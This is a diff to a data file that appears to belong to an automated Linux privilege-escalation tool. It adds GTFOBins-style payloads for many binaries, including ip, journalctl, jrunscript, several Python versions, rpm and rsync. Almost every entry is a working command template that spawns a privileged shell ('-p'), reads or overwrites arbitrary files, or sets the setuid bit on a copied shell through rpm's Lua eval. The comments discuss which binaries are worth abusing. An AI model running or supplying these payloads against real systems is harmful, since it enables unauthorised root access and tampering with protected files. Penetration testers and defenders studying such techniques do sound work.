@@ -493,7 +493,7 @@
 	"easy_install": [
 		{
 			"type": "shell",
-			"payload": "TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('/bin/sh', 'sh', '-c', '{shell} <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; {command} $TF",
+			"payload": "TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('{shell}', '{shell}', '-c', '{shell} -p <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; {command} $TF",
 			"args": [],
 			"exit": "exit\n"
 		},
@@ -508,7 +508,7 @@
 		{
 			"type": "write",
 			"stream": "base64",
-			"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/b64; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import base64\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\" > $TF/setup.py; {command} $TF 2>/dev/null",
+			"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/b64; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import base64\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\" > $TF/setup.py; {command} $TF 2>/dev/null; {rm} -f $TF/b64",
 			"args": [],
 			"exit": "{ctrl_d}{ctrl_d}"
 		}
@@ -829,6 +829,177 @@
 			"args": ["''", "{lfile}"]
 		}
 	],
+//-------------------------------------------------------------------
+	"gtester": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo '#!{shell} -p' > $TF; echo 'exec {shell} -p 0<&1' >> $TF; {chmod} +x $TF; {command}; rm -f $TF",
+			"args": ["-q", "$TF"]
+		}
+		// This could also be used to get read and write.
+		// But the shell should unlock everything.
+	],
+//-------------------------------------------------------------------
+// hd COULD be used for file read.... maybe???
+// it displays it in hex that cannot be easily converted
+//-------------------------------------------------------------------
+	"head": [
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c1GB", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+// hexdump COULD be used for file read.... maybe???
+// it displays it in hex that cannot be easily converted
+//-------------------------------------------------------------------
+	"highlight": [
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "{command}",
+			"args": ["--no-doc", "--failsafe", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"iconv": [
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-f", "8859_1", "-t", "8859_1", "{lfile}"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "{base64} -d | {command}",
+			"args": ["-f", "8859_1", "-t", "8859_1", "-o", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+// iftop could be used to get a shell, but it requires
+// permissions to capture network traffic on a device interface... unlikely.
+// also, it needs to have subshells enabled... with might also be unlikely
+//-------------------------------------------------------------------
+	"ionice": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}", "-p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"ip": [
+		// Using this to file read seems to clobber line output.
+		// Regardless, if it can get a shell, it will get all the other capabilities!
+		{
+			"type": "shell",
+			"payload": "{command} netns add foo; {command} netns exec foo {shell} -p && {command} netns delete foo",
+			"args": [],
+			"exit": "exit\n{ip} netns delete foo\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"irb": [
+		// this is a clone of modified ruby's GTFOBins, since this is a ruby interpreter
+		// the shell does not keep setuid permissions
+		
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+			"args": ["$TF"]
+		},
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command} | {head} -n -2 | {tail} -n +2 | {head} -c -1",
+			"args": ["$TF"]
+		},
+		{
+			"type": "write",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+	"irb2.5": [
+		// this is a clone of modified ruby's GTFOBins, since this is a ruby interpreter
+		// the shell does not keep setuid permissions
+		
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+			"args": ["$TF"]
+		},
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command} | {head} -n -2 | {tail} -n +2 | {head} -c -1",
+			"args": ["$TF"]
+		},
+		{
+			"type": "write",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"jjs": [
+		// This can file read and write as well... but it is Java.... so...
+		{
+			"type": "shell",
+			"payload": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('{shell} -pc \\$@|sh\\${{IFS}}-p _ echo {shell} -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | {command}",
+			"args": [""]
+		}
+	],
+//-------------------------------------------------------------------
+	"journalctl": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input": "!{shell} -p\n",
+			"exit": "exit\n{ctrl_c}"
+		}
+	],
+//-------------------------------------------------------------------
+	"jq": [
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "{command}",
+			"args": ["-Rr", ".", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"jrunscript": [
+		// This can file read and write as well... but it is Java.... so...
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-e", "\"exec('/bin/sh -pc \\$@|sh\\${{IFS}}-p _ echo /bin/bash -p <$(tty) >$(tty) 2>$(tty)')\""]
+		}
+	],
 
 
 
@@ -840,9 +1011,216 @@
 
 
 
+//-------------------------------------------------------------------
+	"pry": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["--exec", "'system(\"{shell} -p\");exit'"]
+		}
+	],
 
 
+//-------------------------------------------------------------------
+// puppet could be used to spawn a shell... but it seems unbearably slow on
+// starting bash. 
+//-------------------------------------------------------------------
+	"python": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c", "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\"; {rm} -f $TF/b64",
+			"args": [""],
+			"exit":"{ctrl_d}{ctrl_d}"
+		}
+	],
+	"python3.8": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c", "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+			"args": [""],
+			"exit":"{ctrl_d}{ctrl_d}"
+		}
+	],
+	"python3.7": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c", "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+			"args": [""],
+			"exit":"{ctrl_d}{ctrl_d}"
+		}
+	],
+	"python3.5": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c", "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+			"args": [""],
+			"exit":"{ctrl_d}{ctrl_d}"
+		}
+	],
+	"python3": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c", "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+			"args": [""],
+			"exit":"{ctrl_d}{ctrl_d}"
+		}
+	],
+	"python2": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c", "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+			"args": [""],
+			"exit":"{ctrl_d}{ctrl_d}"
+		}
+	],
+	"python2.7": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]
+		},
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c", "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+			"args": [""],
+			"exit":"{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"rake": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-p", "'`{shell} 1>&0`'"]
+		}
+	],
+//-------------------------------------------------------------------
+// redcarpet could be implemented to read files, but since it is 
+// originally used to process Markdown files, it prepends and appends
+// HTML paragraph tags to output. This can be problematic.
 
+//-------------------------------------------------------------------
+// restic can be implemented, but all it has is file upload.
+// maybe with other uploaders/downloaders this can be used.
+
+//-------------------------------------------------------------------
+// rlogin can be implemented, but all it has is file upload.
+// maybe with other uploaders/downloaders this can be used.
+
+//-------------------------------------------------------------------
+	"rlwrap": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-H", "/dev/null", "{shell}", "-p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"rpm": [
+		{
+			"type": "shell",
+			"payload": "export TS=$({mktemp} -u); cp {shell} $TS; {command}; $TS -p; {rm} -f $TS",
+			"input": "rm -f $TS\nunset TS\n",
+			"args": ["--eval", "\"%{{lua:posix.chown('$TS',0,0);posix.chmod('$TS', '+s');}}\""]
+		}
+	],
+
+//-------------------------------------------------------------------
+	"rpmquery": [
+		{
+			"type": "shell",
+			"payload": "export TS=$({mktemp} -u); cp {shell} $TS; {command}; $TS -p; {rm} -f $TS",
+			"input": "rm -f $TS\nunset TS\n",
+			"args": ["--eval", "\"%{{lua:posix.chown('$TS',0,0);posix.chmod('$TS', '+s');}}\""]
+		}
+	],
+//-------------------------------------------------------------------
+	"rsync": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-e", "'{shell} -p -c \"{shell} -p 0<&2 1>&2\"'", "127.0.0.1:/dev/null"]
+		}
+	],
 //-------------------------------------------------------------------
 	"ruby": [
 		// if ruby is setuid, it will not let you run with -e or pass
